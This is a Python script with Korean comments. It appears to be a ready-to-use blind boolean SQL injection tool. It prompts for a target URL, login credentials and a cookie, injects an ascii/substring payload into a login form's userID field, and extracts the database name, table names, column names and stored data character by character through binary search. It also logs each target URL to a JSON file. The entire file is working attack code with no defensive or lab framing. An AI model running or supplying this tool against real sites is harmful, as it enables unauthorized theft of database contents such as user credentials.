import requests
import time
import json

BSQL = []
BSQL_FILE = 'bsql_data.json'

def save_data_to_file(data, filename):
    with open(filename, 'w') as file:
        json.dump(data, file)

def load_data_from_file(filename):
    try:
        with open(filename, 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return []  # 파일이 없을 경우 빈 리스트를 반환

def save_bsql():
    global BSQL
    save_data_to_file(BSQL, BSQL_FILE)

def load_bsql():
    return load_data_from_file(BSQL_FILE)

headers = {}

def database_name(blind_query):
    query = "SELECT database()"  # 현재 데이터베이스의 이름을 찾는 쿼리
    value = binarySearch(query)
    print("데이터베이스 이름:", value)
   
extracted_table_names = []  # 테이블 이름 리스트 

def extract_table_names(blind_query):
    index = 0
    global extracted_table_names  # 전역 변수 사용 선언
    extracted_table_names = []  # Initialize the list to avoid accumulation
    while True:
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit {index},1"
        value = binarySearch(query)
        if value == "":
            break
        extracted_table_names.append(value)
        index += 1
    return extracted_table_names

extracted_column_names = []  # 컬럼 이름 리스트

def extract_column_names(table, blind_query):
    index = 0
    global extracted_column_names  # 전역 변수 사용 선언
    extracted_column_names = []  # Initialize the list to avoid accumulation
    while True:
        query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema=database() limit {index},1"
        value = binarySearch(query)
        if value == "":
            break
        extracted_column_names.append(value)
        index += 1
    return extracted_column_names

extracted_data = []
# 데이터 추출을 위한 새로운 함수
def extract_data(table, column, blind_query):
    index = 0
    global extracted_data
    extracted_data = []  # Initialize the list to avoid accumulation
    while True:
        query = f"SELECT {column} FROM {table} limit {index},1"
        value = binarySearch(query)
        if value == "":
            break
        extracted_data.append(value)
        index += 1
    return extracted_data

def binarySearch(query):
    s = 1 
    start = 32
    end = 126
    value = ""
    while True:
        mid = int((start+end)/2)
        data = {
            "userID": userID + blind_query.format(query, s, 0),
            "userPassword": userPassword
        }
        
        response = requests.post(url, data=data, headers=headers)
        if index_value in response.text: 
            break
        else:
            data = {
            "userID": userID + blind_query.format(query, s, mid),
            "userPassword": userPassword                
            }
            
            response = requests.post(url, data=data, headers=headers)

            if index_value in response.text:
                end = mid 
            else:
                start = mid

            if start+1 >= end:   
                value += chr(end) 
                s += 1
                start = 32
                end = 126
                

    return value

if __name__ == "__main__":
    url = input("타겟 URL을 입력하세요: ")
    userID = input("ID를 입력해주세요: ")
    userPassword = input("Password를 입력해주세요: ")
    user_agent = input("User-Agent 값을 입력하세요 (기본값 Enter): ")
    if not user_agent:
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    cookie = input("Cookie 값을 입력하세요 (기본값 Enter): ")
    if not cookie:
        cookie = ""
    index_value = input("실패 시그널을 입력하세요: ")

    if cookie == "":
        headers = {
            "User-Agent": user_agent
        }
    else:
        headers = {
            "User-Agent": user_agent,
            "Cookie": cookie    
        }

    blind_query = "' AND ascii(substring(({}),{},1))>{} AND '1'='1'-- "

    database_name(blind_query)  # 데이터베이스 이름 추출

    time.sleep(1)

    extract_table_names(blind_query)  # 테이블 이름 추출

    print("데이터베이스의 모든 테이블 이름:", extracted_table_names)

    table_name = input("데이터를 추출할 테이블 이름을 입력하세요: ")
    if table_name not in extracted_table_names:
        print("잘못된 테이블 이름입니다.")
    else:
        time.sleep(1)
        extract_column_names(table_name, blind_query)  # 해당 테이블의 컬럼 이름 추출

        print(f"테이블 [{table_name}]의 모든 컬럼 이름:", extracted_column_names)

        column_name = input("데이터를 추출할 컬럼 이름을 입력하세요: ")
        if column_name not in extracted_column_names:
            print("잘못된 컬럼 이름입니다.")
        else:
            extracted_data = []  # 컬럼 데이터를 추출하기 전에 리스트 초기화
            extract_data(table_name, column_name, blind_query)
            print(f"테이블 [{table_name}], 컬럼 [{column_name}]의 모든 데이터:", extracted_data)
    
    BSQL.append(url)
    save_data_to_file(BSQL, BSQL_FILE)
    save_bsql()
    